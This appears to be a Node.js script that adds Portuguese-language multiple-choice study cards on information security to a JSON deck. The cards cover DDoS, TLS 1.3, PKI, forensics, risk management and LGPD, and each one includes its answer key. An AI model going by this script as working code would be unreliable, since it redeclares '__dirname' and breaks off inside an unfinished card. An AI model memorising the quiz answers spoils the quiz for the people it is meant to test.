// Adiciona os cards faltantes em seguranca-da-informacao.json para completar 10 por dificuldade
const fs = require("fs");
const path = require("path");
const __dirname = path.dirname(require.main.filename);

const FILE = path.resolve(__dirname, "../data/cards/seguranca-da-informacao.json");
const data = JSON.parse(fs.readFileSync(FILE, "utf-8"));

const newCards = [

  // ─── Cibersegurança: +2F +2M +2D ───────────────────────────────────────
  {
    id: "seguranca-da-informacao__Cibersegurança__Fácil__9",
    tags: ["ddos", "availability", "cyberattack"],
    track: "seguranca-da-informacao",
    category: "Cibersegurança",
    difficulty: "Fácil",
    question: "O que é um ataque DDoS (Distributed Denial of Service)?",
    options: [
      "Ataque que sobrecarrega um serviço com tráfego de múltiplas fontes, tornando-o indisponível",
      "Vírus que se espalha por e-mail",
      "Técnica de roubo de senhas por força bruta",
      "Interceptação de tráfego de rede",
    ],
    correctIndex: 0,
    explanation:
      "DDoS usa múltiplos sistemas (geralmente uma botnet) para inundar o alvo com requisições, esgotando recursos (CPU, banda, conexões) e violando a Disponibilidade da tríade CIA. Mitigações: CDN com scrubbing, rate limiting, anycast, BGP blackholing.",
    example:
      "'Em 2016, o ataque Mirai usou câmeras IoT para derrubar a Dyn DNS, tornando indisponíveis Twitter, Netflix e Reddit por horas.' — Disponibilidade é o A da CIA.",
  },
  {
    id: "seguranca-da-informacao__Cibersegurança__Fácil__10",
    tags: ["patch-management", "vulnerability", "update"],
    track: "seguranca-da-informacao",
    category: "Cibersegurança",
    difficulty: "Fácil",
    question: "Por que é importante manter sistemas e softwares atualizados (patches)?",
    options: [
      "Patches corrigem vulnerabilidades de segurança conhecidas que atacantes poderiam explorar",
      "Apenas para ter novas funcionalidades e melhor desempenho",
      "Somente sistemas Windows precisam de patches",
      "Atualizações são importantes apenas para servidores, não para estações de trabalho",
    ],
    correctIndex: 0,
    explanation:
      "Vulnerabilidades não corrigidas são vetores comuns de ataque. A maioria das violações explora falhas conhecidas com patches disponíveis. Patch management envolve: inventário de ativos, avaliação de criticidade, testes em ambiente controlado e implantação com SLA definido.",
    example:
      "'O ransomware WannaCry (2017) explorou a vulnerabilidade EternalBlue no Windows — havia um patch disponível há 2 meses. Organizações atualizadas não foram afetadas.'",
  },
  {
    id: "seguranca-da-informacao__Cibersegurança__Médio__9",
    tags: ["vulnerability-assessment", "pentest", "scanning"],
    track: "seguranca-da-informacao",
    category: "Cibersegurança",
    difficulty: "Médio",
    question: "Qual é a diferença entre avaliação de vulnerabilidades (vulnerability assessment) e teste de penetração (pentest)?",
    options: [
      "VA identifica e classifica vulnerabilidades; pentest tenta explorá-las para demonstrar impacto real",
      "São sinônimos — ambos tentam invadir o sistema",
      "VA é manual; pentest é automatizado",
      "VA é realizado externamente; pentest apenas internamente",
    ],
    correctIndex: 0,
    explanation:
      "Vulnerability Assessment: escaneia, identifica e prioriza vulnerabilidades (geralmente automatizado, ex: Nessus, Qualys). Pentest: simula um atacante real, explora vulnerabilidades encadeadas, demonstra impacto de negócio. VA é mais frequente; pentest é mais profundo e pontual.",
    example:
      "'VA semanal detectou 47 vulnerabilidades no servidor web. O pentest anual demonstrou que encadeando 3 delas era possível obter acesso root ao banco de dados de clientes.'",
  },
  {
    id: "seguranca-da-informacao__Cibersegurança__Médio__10",
    tags: ["defense-in-depth", "layered-security", "strategy"],
    track: "seguranca-da-informacao",
    category: "Cibersegurança",
    difficulty: "Médio",
    question: "O que é defesa em profundidade (defense in depth) e por que é mais eficaz que depender de um único controle?",
    options: [
      "Estratégia de múltiplas camadas de segurança: uma falha não compromete todo o sistema",
      "Técnica de monitorar redes em profundidade usando IA",
      "Proteção física dos servidores com múltiplas fechaduras",
      "Uso de firewall de última geração como único controle necessário",
    ],
    correctIndex: 0,
    explanation:
      "Defense in depth (camadas): física → rede → perímetro → endpoint → aplicação → dados → pessoas. Cada camada assume que as anteriores podem falhar. Conceito do castelo medieval: fosso (firewall), muralha (IPS), guarda (EDR), cofre (criptografia de dados).",
    example:
      "'Mesmo que o phishing ultrapasse o e-mail gateway (camada 1), o 2FA bloqueia o login (camada 2), o EDR detecta o payload (camada 3) e a segmentação limita o movimento lateral (camada 4).'",
  },
  {
    id: "seguranca-da-informacao__Cibersegurança__Difícil__9",
    tags: ["deception-technology", "honeypot", "active-defense"],
    track: "seguranca-da-informacao",
    category: "Cibersegurança",
    difficulty: "Difícil",
    question: "O que é deception technology e como honeypots e honeynets contribuem para a defesa ativa?",
    options: [
      "Sistemas falsos que atraem atacantes, revelando TTPs sem risco aos ativos reais e gerando alertas de alta fidelidade",
      "Técnica de enganar funcionários para testar conscientização em segurança",
      "Uso de IPs falsos em logs para confundir atacantes",
      "Firewalls que simulam portas abertas para atrapalhar port scanning",
    ],
    correctIndex: 0,
    explanation:
      "Honeypots são sistemas intencionalmente vulneráveis que simulam ativos reais. Qualquer interação é suspeita (zero false positives). Honeynets são redes de honeypots. TTPs coletadas alimentam threat intelligence. Deception platforms modernas (ex: Attivo Networks) distribuem decoys em toda a rede.",
    example:
      "'Um honeypot simulando um servidor SQL com dados falsos registrou um atacante que usou credenciais comprometidas — o alerta foi disparado imediatamente, revelando o IP do C2 sem expor dados reais.'",
  },
  {
    id: "seguranca-da-informacao__Cibersegurança__Difícil__10",
    tags: ["xdr", "detection-response", "security-operations"],
    track: "seguranca-da-informacao",
    category: "Cibersegurança",
    difficulty: "Difícil",
    question: "O que é XDR (Extended Detection and Response) e como supera as limitações do EDR isolado?",
    options: [
      "XDR correlaciona telemetria de endpoint, rede, e-mail e cloud em uma plataforma unificada para detecção e resposta integradas",
      "XDR é apenas um EDR com mais módulos de antivírus",
      "XDR substitui o SIEM tornando-o obsoleto completamente",
      "XDR é a versão cloud-native do EDR, sem diferenças funcionais",
    ],
    correctIndex: 0,
    explanation:
      "EDR monitora endpoints isoladamente. XDR correlaciona dados de múltiplas fontes (email, firewall, identidade, cloud) para detectar ataques que cruzam camadas. Reduz alertas isolados (silos) em incidentes correlacionados. MXDR = Managed XDR (terceirizado). Complementa o SIEM com resposta automatizada.",
    example:
      "'O EDR detectou execução suspeita no endpoint. O XDR correlacionou: e-mail de phishing recebido 2h antes → credencial IAM usada 1h depois → exfiltração S3 → incidente unificado com contexto completo.'",
  },

  // ─── Criptografia: +2F +1M +1D ────────────────────────────────────────
  {
    id: "seguranca-da-informacao__Criptografia__Fácil__9",
    tags: ["encryption-at-rest", "data-protection", "storage"],
    track: "seguranca-da-informacao",
    category: "Criptografia",
    difficulty: "Fácil",
    question: "O que é criptografia de dados em repouso (encryption at rest)?",
    options: [
      "Proteção de dados armazenados em disco ou banco de dados por meio de criptografia quando não estão em trânsito",
      "Criptografia ativada apenas quando o computador está desligado",
      "Proteção de dados trafegando pela rede",
      "Processo de arquivar dados antigos de forma segura",
    ],
    correctIndex: 0,
    explanation:
      "Encryption at rest protege dados armazenados (disco, banco de dados, backup, S3). Se alguém obtiver o dispositivo/mídia físico sem a chave, os dados permanecem ilegíveis. Tecnologias: BitLocker, LUKS (Linux), TDE (Transparent Data Encryption em bancos), SSE no S3. Complementa a criptografia em trânsito (TLS).",
    example:
      "'Um notebook roubado com BitLocker ativo: sem a chave de recuperação, o conteúdo do HD é ilegível. Sem criptografia em repouso, todos os arquivos estariam expostos.'",
  },
  {
    id: "seguranca-da-informacao__Criptografia__Fácil__10",
    tags: ["kerckhoffs", "security-principle", "open-design"],
    track: "seguranca-da-informacao",
    category: "Criptografia",
    difficulty: "Fácil",
    question: "O que é o Princípio de Kerckhoffs em criptografia?",
    options: [
      "A segurança de um sistema criptográfico deve depender apenas do segredo da chave, não do segredo do algoritmo",
      "Algoritmos criptográficos devem ser mantidos secretos para máxima segurança",
      "Chaves criptográficas devem ser o mais longas possível",
      "Qualquer sistema pode ser quebrado dado tempo e recursos suficientes",
    ],
    correctIndex: 0,
    explanation:
      "Kerckhoffs (1883): um sistema criptográfico deve ser seguro mesmo que tudo sobre ele, exceto a chave, seja de conhecimento público. Isso leva ao conceito de 'security through obscurity' ser falso. AES, RSA, SHA são públicos e auditados pela comunidade — a segurança está na chave, não no sigilo do algoritmo.",
    example:
      "'Security through obscurity é uma má prática: depender do segredo do algoritmo é frágil porque pode ser descoberto. Algoritmos abertos e revisados como AES são mais confiáveis que algoritmos proprietários secretos.'",
  },
  {
    id: "seguranca-da-informacao__Criptografia__Médio__10",
    tags: ["tls", "handshake", "transport-security"],
    track: "seguranca-da-informacao",
    category: "Criptografia",
    difficulty: "Médio",
    question: "Como funciona o handshake TLS 1.3 e por que ele é mais seguro que o TLS 1.2?",
    options: [
      "TLS 1.3 usa apenas 1 RTT, removeu cifras fracas (RSA estático, RC4, DES) e exige PFS (Perfect Forward Secrecy) obrigatório",
      "TLS 1.3 usa 3 RTTs para maior segurança, mantendo compatibilidade com TLS 1.2",
      "TLS 1.3 é idêntico ao TLS 1.2 com suporte a certificados maiores",
      "TLS 1.3 substituiu criptografia assimétrica por simétrica pura para maior velocidade",
    ],
    correctIndex: 0,
    explanation:
      "TLS 1.3 melhorias: 1-RTT (0-RTT para sessões retomadas), remoção de RSA key exchange (apenas ECDHE/DHE — garante PFS), remoção de cifras inseguras (RC4, 3DES, CBC modes), autenticação mais forte. PFS garante que comprometer a chave privada do servidor não decripta sessões passadas gravadas.",
    example:
      "'No TLS 1.2 com RSA estático, gravar tráfego cifrado e depois obter a chave privada do servidor permitia decriptar tudo. Com TLS 1.3 + ECDHE, cada sessão tem sua própria chave efêmera — PFS.'",
  },
  {
    id: "seguranca-da-informacao__Criptografia__Difícil__10",
    tags: ["signal-protocol", "double-ratchet", "e2e-encryption"],
    track: "seguranca-da-informacao",
    category: "Criptografia",
    difficulty: "Difícil",
    question: "O que é o protocolo Signal e que inovações criptográficas ele introduz para mensagens seguras?",
    options: [
      "Usa Double Ratchet (X3DH + Ratchet simétrico) para PFS e post-compromise security em cada mensagem",
      "Usa AES-256 com uma chave compartilhada fixa por conversa para máxima simplicidade",
      "É baseado em RSA-4096 com rotação de chaves diária",
      "Utiliza certificados X.509 para cada mensagem, garantindo não-repúdio",
    ],
    correctIndex: 0,
    explanation:
      "Signal usa: X3DH (Extended Triple Diffie-Hellman) para estabelecimento inicial de chave, Double Ratchet para derivar nova chave a cada mensagem. Resultado: PFS (comprometer chave atual não expõe mensagens passadas) + post-compromise security (após comprometimento, recupera segurança automaticamente). Adotado pelo WhatsApp, Signal App, Google Messages (RCS).",
    example:
      "'No Double Ratchet, comprometer a chave da mensagem 50 não expõe as mensagens 1-49 (PFS) nem as mensagens 51+ à medida que o ratchet avança (post-compromise security).'",
  },

  // ─── Certificados Digitais e PKI: +1F +1M +1D ──────────────────────────
  {
    id: "seguranca-da-informacao__Certificados Digitais e PKI__Fácil__10",
    tags: ["self-signed", "certificate", "pki"],
    track: "seguranca-da-informacao",
    category: "Certificados Digitais e PKI",
    difficulty: "Fácil",
    question: "O que é um certificado autoassinado (self-signed) e quando pode ser usado adequadamente?",
    options: [
      "Certificado assinado pela própria entidade, sem CA confiável — válido para ambientes internos/dev, não para produção pública",
      "Certificado gratuito emitido por Let's Encrypt para todos os sites",
      "Certificado que não expira e por isso é mais seguro",
      "Tipo especial de certificado EV com validação simplificada",
    ],
    correctIndex: 0,
    explanation:
      "Self-signed: a entidade atua como sua própria CA. Navegadores exibem erro de segurança pois a CA não é confiável. Usos válidos: ambientes de desenvolvimento local, comunicação interna corporativa (com instalação manual da CA interna), laboratórios. Em produção pública, usar CA reconhecida (Let's Encrypt, DigiCert etc.).",
    example:
      "'Servidor de CI/CD interno usa certificado autoassinado — comunicação cifrada garantida internamente. Em contraste, o site de e-commerce usa certificado DigiCert OV para que navegadores confiem sem alertas.'",
  },
  {
    id: "seguranca-da-informacao__Certificados Digitais e PKI__Médio__10",
    tags: ["dane", "tlsa", "dns-security"],
    track: "seguranca-da-informacao",
    category: "Certificados Digitais e PKI",
    difficulty: "Médio",
    question: "O que é DANE (DNS-Based Authentication of Named Entities) e qual problema resolve?",
    options: [
      "Permite vincular certificados TLS a registros DNS (TLSA) assinados por DNSSEC, reduzindo dependência de CAs externas",
      "Protocolo DNS que substitui o HTTPS para domínios seguros",
      "Sistema de autenticação de usuários baseado em DNS",
      "Alternativa ao OCSP para verificação de revogação de certificados",
    ],
    correctIndex: 0,
    explanation:
      "DANE usa registros TLSA no DNS (protegidos por DNSSEC) para especificar quais certificados TLS são válidos para um domínio. Resolve o problema de CAs desonestas emitindo certificados fraudulentos: mesmo que uma CA seja comprometida, o registro TLSA no DNS limita quais certificados são aceitos.",
    example:
      "'TLSA record: _443._tcp.example.com TLSA 3 1 1 <hash-certificado> — o cliente verifica se o certificado TLS apresentado bate com o hash no DNS. CAs mal-intencionadas não podem emitir certificados aceitos.'",
  },
  {
    id: "seguranca-da-informacao__Certificados Digitais e PKI__Difícil__10",
    tags: ["root-ca", "intermediate-ca", "offline-ca", "pki-hierarchy"],
    track: "seguranca-da-informacao",
    category: "Certificados Digitais e PKI",
    difficulty: "Difícil",
    question: "Por que em PKIs corporativas a Root CA é mantida offline e certificados são emitidos por Intermediate CAs online?",
    options: [
      "Root CA offline protege a chave raiz: se a Intermediate CA for comprometida, a Root CA (offline) pode revogar e reemitir sem comprometer toda a PKI",
      "Por questões de desempenho: a Root CA offline é muito lenta para uso diário",
      "A Root CA online reduziria a compatibilidade com navegadores antigos",
      "Regulações de segurança exigem que toda CA seja offline para conformidade com ISO 27001",
    ],
    correctIndex: 0,
    explanation:
      "Hierarquia de confiança: Root CA (offline, HSM, air-gapped) → Intermediate CA (online, emite certificados finais). Se a Intermediate CA for comprometida: a Root CA revoga o certificado da Intermediate, emite nova. Se a Root CA fosse comprometida, toda a PKI seria inválida. Práticas: Root CA em cerimônias formais com quórum de key custodians.",
    example:
      "'A Root CA do governo fica em bunker, desconectada da internet, usada apenas em cerimônias anuais para renovar certificados das Intermediate CAs. Um atacante que comprometa a Intermediate CA não afeta a raiz de confiança.'",
  },

  // ─── Controle de Acesso: +1F +1M +1D ──────────────────────────────────
  {
    id: "seguranca-da-informacao__Controle de Acesso__Fácil__10",
    tags: ["passwordless", "authentication", "fido"],
    track: "seguranca-da-informacao",
    category: "Controle de Acesso",
    difficulty: "Fácil",
    question: "O que é autenticação sem senha (passwordless authentication) e quais tecnologias a implementam?",
    options: [
      "Autenticação que elimina senhas usando biometria, chaves FIDO2, magic links ou passkeys como fator principal",
      "Autenticação que usa senha mais longa (passphrase) em vez de senha simples",
      "SSO que armazena a senha em cofre, autenticando o usuário automaticamente",
      "Autenticação baseada apenas em endereço IP e horário de acesso",
    ],
    correctIndex: 0,
    explanation:
      "Passwordless elimina o vetor de ataque de senhas roubadas/reutilizadas. Tecnologias: FIDO2/WebAuthn (chave criptográfica no dispositivo), Passkeys (Google/Apple/Microsoft), biometria (Touch ID, Face ID), magic links por e-mail. Mais seguro e mais conveniente para o usuário.",
    example:
      "'Ao fazer login com Passkey, o navegador solicita biometria ou PIN do dispositivo. Uma chave privada local assina o desafio do servidor — sem senha trafegar pela rede para ser interceptada ou vazada em breaches.'",
  },
  {
    id: "seguranca-da-informacao__Controle de Acesso__Médio__10",
    tags: ["provisioning", "deprovisioning", "iam", "lifecycle"],
    track: "seguranca-da-informacao",
    category: "Controle de Acesso",
    difficulty: "Médio",
    question: "Por que o desprovisionamento de identidades (offboarding) é um controle crítico de segurança?",
    options: [
      "Acessos não revogados de ex-funcionários são vetores de risco: funcionários demitidos podem acessar sistemas indevidamente",
      "Apenas para liberar licenças de software e reduzir custos",
      "Necessário apenas para usuários com privilégios de administrador",
      "Sem impacto de segurança — contas inativas ficam bloqueadas automaticamente",
    ],
    correctIndex: 0,
    explanation:
      "Contas órfãs (de ex-funcionários, fornecedores, projetos encerrados) são frequentemente exploradas em ataques. Best practices: desativação imediata no D-day do desligamento, processo automatizado integrado ao RH (IGA — Identity Governance and Administration), revisões periódicas de acessos (access review/recertification).",
    example:
      "'Caso real: ex-funcionário insatisfeito usou credenciais não revogadas 2 meses após demissão para deletar dados críticos. Offboarding automatizado integrado ao HRIS teria desativado o acesso no último dia de trabalho.'",
  },
  {
    id: "seguranca-da-informacao__Controle de Acesso__Difícil__10",
    tags: ["short-lived-credentials", "sts", "dynamic-secrets"],
    track: "seguranca-da-informacao",
    category: "Controle de Acesso",
    difficulty: "Difícil",
    question: "Por que credenciais de curta duração (short-lived credentials) são preferíveis a secrets estáticos em arquiteturas modernas?",
    options: [
      "Minimizam janela de exploração: credenciais expiram em minutos/horas, tornando vazamentos inúteis rapidamente",
      "São mais fáceis de gerenciar pois não precisam ser rotacionadas",
      "Eliminam completamente a necessidade de criptografia em trânsito",
      "São preferíveis apenas em ambientes cloud, não em on-premises",
    ],
    correctIndex: 0,
    explanation:
      "Static secrets (API keys permanentes) vazados ficam válidos indefinidamente. Short-lived credentials: AWS STS AssumeRole (tokens de 1h), Vault dynamic secrets (senha de BD gerada por demanda, TTL de minutos), SPIFFE/SPIRE (SVIDs com curta validade). Reduze raio de explosão de vazamentos.",
    example:
      "'Em vez de um API key permanente do banco de dados no código, a aplicação solicita ao HashiCorp Vault uma senha dinâmica com TTL de 1 hora. Se a credencial vazar, ela expira sozinha; o Vault audita cada emissão.'",
  },

  // ─── Forense Digital: +1F +1M +1D ─────────────────────────────────────
  {
    id: "seguranca-da-informacao__Forense Digital__Fácil__10",
    tags: ["ntp", "timestamps", "timeline", "forensics"],
    track: "seguranca-da-informacao",
    category: "Forense Digital",
    difficulty: "Fácil",
    question: "Por que a sincronização de relógios (NTP) é fundamental para análise forense de incidentes?",
    options: [
      "Timestamps precisos permitem correlacionar eventos em sistemas diferentes e reconstruir a timeline do incidente",
      "NTP é necessário apenas para sistemas de backup, não para forense",
      "Sem NTP, os sistemas ficam mais lentos, dificultando a coleta de evidências",
      "NTP garante que logs sejam criptografados automaticamente",
    ],
    correctIndex: 0,
    explanation:
      "Relógios dessincronizados tornam a correlação de logs impossível: um evento no firewall às 14:00 e o mesmo evento no servidor às 14:03 podem parecer não relacionados. NTP (RFC 5905) sincroniza todos os sistemas a uma fonte confiável. Stratum 1 = servidor conectado ao relógio atômico/GPS.",
    example:
      "'No incidente: firewall registrou conexão suspeita às 10:00:05. Servidor tinha relógio 8 minutos adiantado, registrando às 10:08 — correlação manual foi necessária e quase falhou. NTP teria prevenido isso.'",
  },
  {
    id: "seguranca-da-informacao__Forense Digital__Médio__10",
    tags: ["prefetch", "windows-artifacts", "execution-evidence"],
    track: "seguranca-da-informacao",
    category: "Forense Digital",
    difficulty: "Médio",
    question: "O que são arquivos Prefetch no Windows e qual evidência forense eles fornecem?",
    options: [
      "Registros de execução de programas com nome, path, data/hora e contagem de execuções — provam que um executável foi rodado",
      "Arquivos de pré-carregamento do BIOS que registram inicializações do sistema",
      "Cache de rede para acesso rápido a sites frequentes",
      "Arquivos de configuração de drivers criados na primeira inicialização",
    ],
    correctIndex: 0,
    explanation:
      "Prefetch (C:\\Windows\\Prefetch\\*.pf): criado na primeira execução de um programa para otimizar carregamentos futuros. Contém: nome do executável, hash do path, data/hora das últimas 8 execuções, contagem de execuções, DLLs carregadas. Evidência forense de execução de malware mesmo após deleção do arquivo original.",
    example:
      "'Malware foi deletado, mas o arquivo MALWARE.EXE-XXXXXXXX.pf ainda existia, provando que foi executado em 15/03/2026 às 22:47, com 3 execuções — evidência crucial para linha do tempo forense.'",
  },
  {
    id: "seguranca-da-informacao__Forense Digital__Difícil__10",
    tags: ["cloud-forensics", "shared-responsibility", "ephemeral"],
    track: "seguranca-da-informacao",
    category: "Forense Digital",
    difficulty: "Difícil",
    question: "Quais são os principais desafios da forense digital em ambientes cloud (IaaS/PaaS/SaaS)?",
    options: [
      "Recursos efêmeros (containers/VMs destruídas), acesso limitado à infraestrutura física, dados em jurisdições múltiplas e logs dependentes do provedor",
      "Ausência de logs — provedores cloud não registram atividades por padrão",
      "Impossibilidade técnica de obter imagens forenses de VMs em cloud",
      "A responsabilidade forense é sempre 100% do provedor cloud, não do cliente",
    ],
    correctIndex: 0,
    explanation:
      "Desafios cloud forensics: (1) Efemeridade: instâncias/containers encerrados perdem evidências; (2) Modelo de responsabilidade compartilhada: cliente acessa apenas parte dos logs; (3) Multi-jurisdição: dados em datacenters em países diferentes; (4) Sem acesso físico. Mitigações: CloudTrail/Audit Logs, snapshots frequentes, forensic readiness plan.",
    example:
      "'Container comprometido foi encerrado automaticamente pelo orquestrador (Kubernetes). Sem snapshot prévio, evidências em memória foram perdidas. A solução é: CloudWatch + S3 logs + snapshot automático ao detectar anomalia.'",
  },

  // ─── Gestão de Riscos: +1F +1M +1D ────────────────────────────────────
  {
    id: "seguranca-da-informacao__Gestão de Riscos__Fácil__10",
    tags: ["third-party-risk", "supplier", "vendor"],
    track: "seguranca-da-informacao",
    category: "Gestão de Riscos",
    difficulty: "Fácil",
    question: "O que é risco de terceiros (third-party risk) em gestão de riscos de segurança?",
    options: [
      "Risco introduzido por fornecedores, parceiros e prestadores de serviço que têm acesso a dados ou sistemas da organização",
      "Riscos causados por ataques vindos de terceiros países estrangeiros",
      "Apenas riscos financeiros associados a contratos com fornecedores",
      "Riscos de hardware adquirido de fabricantes externos",
    ],
    correctIndex: 0,
    explanation:
      "Terceiros (fornecedores de software, prestadores de serviço, parceiros) podem introduzir vulnerabilidades na cadeia de fornecimento. O ataque à SolarWinds (2020) comprometeu milhares de organizações via atualização de software legítima. Controles: due diligence, questionários de segurança (SIG), auditorias, cláusulas contratuais de segurança.",
    example:
      "'Uma empresa financeira avalia seus 200 fornecedores: os 20 com acesso a dados críticos passam por auditoria anual; os demais respondem a questionário de segurança. SLAs incluem requisitos de notificação de incidentes em 72h.'",
  },
  {
    id: "seguranca-da-informacao__Gestão de Riscos__Médio__10",
    tags: ["risk-heat-map", "prioritization", "risk-visualization"],
    track: "seguranca-da-informacao",
    category: "Gestão de Riscos",
    difficulty: "Médio",
    question: "O que é um Risk Heat Map e como auxilia na priorização de tratamento de riscos?",
    options: [
      "Representação visual de riscos em grade de probabilidade × impacto com cores (verde/amarelo/vermelho) para priorizar ação",
      "Mapa geográfico que indica regiões com maior concentração de ameaças cibernéticas",
      "Dashboard de temperatura dos servidores para identificar riscos de hardware",
      "Relatório mensal de incidentes de segurança classificados por severidade",
    ],
    correctIndex: 0,
    explanation:
      "Heat map de riscos: eixo X = probabilidade (1-5), eixo Y = impacto (1-5), cores: verde (<5), amarelo (5-12), vermelho (>12). Permite comunicar riscos à liderança visualmente. Riscos no quadrante 'alta probabilidade + alto impacto' (vermelho) são tratados prioritariamente. Complementa o risk register com visão executiva.",
    example:
      "'CEO viu o heat map: risco de ransomware estava em vermelho (probabilidade 4, impacto 5). Aprovação imediata para investimento em backup offline e EDR. Risco de falha de gerador estava em amarelo — monitorado mas não urgente.'",
  },
  {
    id: "seguranca-da-informacao__Gestão de Riscos__Difícil__10",
    tags: ["octave", "risk-methodology", "asset-based"],
    track: "seguranca-da-informacao",
    category: "Gestão de Riscos",
    difficulty: "Difícil",
    question: "O que é a metodologia OCTAVE (Operationally Critical Threat, Asset, and Vulnerability Evaluation)?",
    options: [
      "Metodologia de avaliação de riscos baseada em ativos críticos, conduzida pela própria organização, integrando perspectivas tecnológicas e organizacionais",
      "Framework NIST para avaliação de vulnerabilidades técnicas em sistemas de TI",
      "Metodologia de teste de penetração em três fases desenvolvida pela SANS",
      "Padrão ISO para quantificação monetária de riscos de segurança",
    ],
    correctIndex: 0,
    explanation:
      "OCTAVE (Carnegie Mellon/SEI): 3 fases: (1) Construir perfis de ameaças baseados em ativos — equipes internas identificam ativos críticos e ameaças; (2) Identificar vulnerabilidades de infraestrutura; (3) Desenvolver estratégia de segurança. OCTAVE Allegro é versão simplificada. Diferenciais: liderada internamente, foco em impacto organizacional, não apenas técnico.",
    example:
      "'A equipe identificou o banco de dados de clientes como ativo crítico, mapeou ameaças (ex: funcionário desonesto, SQL injection) e vulnerabilidades (ex: sem criptografia em repouso). A estratégia resultante priorizou controles baseados no impacto aos objetivos de negócio.'",
  },

  // ─── Governança e Compliance: +1F +1M +1D ─────────────────────────────
  {
    id: "seguranca-da-informacao__Governança e Compliance__Fácil__10",
    tags: ["accountability", "governance", "responsibility"],
    track: "seguranca-da-informacao",
    category: "Governança e Compliance",
    difficulty: "Fácil",
    question: "O que é o princípio da prestação de contas (accountability) em governança de TI?",
    options: [
      "Cada ativo, processo e risco deve ter um responsável definido que responde pelos resultados e decisões associados",
      "Obrigação de registrar todas as transações financeiras de TI",
      "Princípio que determina que auditores externos devem revisar todos os controles",
      "Responsabilidade exclusiva do CEO por todas as decisões de segurança",
    ],
    correctIndex: 0,
    explanation:
      "Accountability: definição clara de quem é responsável por quê. Em segurança: cada ativo tem um 'dono' (asset owner) responsável por classificar, proteger e definir controles. Risk owner responde pelo risco. Diferente de 'responsibility' (executa a tarefa): o risk owner pode delegar execução mas mantém accountability.",
    example:
      "'O gerente de RH é accountable pelos dados de funcionários: define nível de classificação, aprova acessos, responde por incidentes. A equipe de TI é responsável (responsible) por implementar os controles técnicos definidos.'",
  },
  {
    id: "seguranca-da-informacao__Governança e Compliance__Médio__10",
    tags: ["dpia", "privacy-impact", "gdpr", "lgpd"],
    track: "seguranca-da-informacao",
    category: "Governança e Compliance",
    difficulty: "Médio",
    question: "O que é uma DPIA (Data Protection Impact Assessment) e quando é obrigatória?",
    options: [
      "Avaliação formal de riscos de privacidade para novos tratamentos que possam gerar alto risco a titulares, obrigatória pelo GDPR e recomendada pela LGPD",
      "Auditoria anual obrigatória para todas as empresas que possuem dados pessoais",
      "Relatório de impacto financeiro de multas por violações de privacidade",
      "Certificação de conformidade com a LGPD emitida pela ANPD",
    ],
    correctIndex: 0,
    explanation:
      "DPIA (GDPR Art. 35) / RIPD (LGPD): obrigatório quando tratamento implica alto risco — uso de dados sensíveis em larga escala, monitoramento sistemático, decisões automatizadas com impacto significativo. Processo: descrever o tratamento, avaliar necessidade e proporcionalidade, identificar riscos, definir medidas de mitigação.",
    example:
      "'Empresa de RH implementa IA para triagem automática de currículos. DPIA obrigatória: decisões automatizadas com impacto significativo (Art. 35 GDPR). Avaliação identificou viés algorítmico como risco — controles de auditoria e opt-out foram implementados.'",
  },
  {
    id: "seguranca-da-informacao__Governança e Compliance__Difícil__10",
    tags: ["shared-responsibility", "cloud-compliance", "cloud-governance"],
    track: "seguranca-da-informacao",
    category: "Governança e Compliance",
    difficulty: "Difícil",
    question: "Como o modelo de responsabilidade compartilhada (shared responsibility model) impacta compliance em cloud?",
    options: [
      "Divide obrigações de controle entre provedor (infraestrutura/hipervisor) e cliente (dados/aplicações/IAM) — auditores exigem evidências de ambas as partes",
      "O provedor cloud é responsável por 100% da conformidade regulatória dos clientes",
      "O cliente é responsável por tudo, incluindo segurança física dos datacenters",
      "Não há impacto: regulações como PCI-DSS não se aplicam a ambientes cloud",
    ],
    correctIndex: 0,
    explanation:
      "Em IaaS: provedor responde por hardware/rede/hipervisor; cliente por SO, dados, IAM, rede virtual. Em SaaS: provedor responde por quase tudo; cliente por dados e configuração de acesso. Para PCI-DSS em cloud: provedor fornece attestation (ex: AWS PCI compliance); cliente ainda precisa comprovar seus próprios controles de aplicação/dados.",
    example:
      "'Auditoria PCI-DSS: AWS forneceu AOC (Attestation of Compliance) cobrindo datacenters e hipervisores. A empresa ainda precisou demonstrar: criptografia de dados de cartão em suas aplicações, controles de acesso IAM, logs de auditoria configurados no CloudTrail.'",
  },

  // ─── LGPD: +1F +1M +1D ────────────────────────────────────────────────
  {
    id: "seguranca-da-informacao__LGPD__Fácil__10",
    tags: ["transparency", "lgpd", "principles"],
    track: "seguranca-da-informacao",
    category: "LGPD",
    difficulty: "Fácil",
    question: "O que é o princípio da transparência na LGPD?",
    options: [
      "Garantir ao titular informações claras, precisas e acessíveis sobre o tratamento dos seus dados pessoais",
      "Obrigatoriedade de publicar todos os dados da empresa em portal público",
      "Exigência de que algoritmos de decisão sejam publicados abertamente",
      "Tornar públicas as sanções aplicadas pela ANPD",
    ],
    correctIndex: 0,
    explanation:
      "Art. 6º, VI LGPD: transparência garante que o titular saiba claramente: quais dados são coletados, para qual finalidade, por quanto tempo serão armazenados, com quem serão compartilhados. Viabilizando através de avisos de privacidade claros, política de privacidade acessível e comunicação em linguagem simples.",
    example:
      "'O app de delivery, ao coletar localização, informa claramente: por quê (entregar pedidos), por quanto tempo (até 90 dias), com quem (restaurante parceiro). Texto claro, não em letras miúdas — isso é transparência na LGPD.'",
  },
  {
    id: "seguranca-da-informacao__LGPD__Médio__10",
    tags: ["sanctions", "anpd", "penalties", "lgpd"],
    track: "seguranca-da-informacao",
    category: "LGPD",
    difficulty: "Médio",
    question: "Quais são as penalidades previstas pela LGPD para descumprimento e quem as aplica?",
    options: [
      "ANPD pode aplicar advertência, multa de até 2% do faturamento (máx R$50M/infração), bloqueio ou eliminação de dados e proibição de atividade de tratamento",
      "Apenas multas administrativas de até R$ 5.000, aplicadas pelo Ministério da Justiça",
      "Somente penalidades criminais com prisão para o DPO responsável",
      "Multas ilimitadas, calculadas com base no número de titulares afetados",
    ],
    correctIndex: 0,
    explanation:
      "Art. 52 LGPD — sanções da ANPD: advertência com prazo para adotar medidas corretivas; multa simples (até 2% do faturamento do grupo no Brasil, limitada a R$ 50M por infração); multa diária; publicização da infração; bloqueio dos dados pessoais envolvidos; eliminação dos dados pessoais envolvidos; suspensão parcial ou total da atividade de tratamento.",
    example:
      "'Empresa de e-commerce sofreu vazamento de 1M de cadastros sem notificar a ANPD em 72h. Penalidades aplicadas: advertência + multa de R$ 1,2M (2% do faturamento). A publicização da infração gerou dano reputacional ainda maior.'",
  },
  {
    id: "seguranca-da-informacao__LGPD__Difícil__10",
    tags: ["lgpd-extraterritorial", "international", "applicability"],
    track: "seguranca-da-informacao",
